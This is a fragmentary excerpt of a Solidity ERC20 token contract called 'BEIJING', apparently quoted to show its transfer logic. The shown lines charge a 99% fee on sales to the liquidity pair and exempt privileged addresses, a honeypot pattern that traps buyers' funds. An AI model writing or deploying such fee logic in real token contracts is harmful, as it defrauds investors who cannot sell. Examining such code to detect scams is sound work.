...
contract BEIJING is ERC20, Ownable{
    ...
    uint256 tsupply = 8000000000 * 10 ** decimals();
    ...
    constructor(address _MarketingWallet) ERC20(unicode"北京市", "BEIJING") {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        ...
        if (swapping || excludedFromFees[sender] || excludedFromFees[recipient]) fee = 0;
            ...
            if(recipient == pair) fee = amount * 99 / 100;
            else fee = amount * 0 / 100;
        }
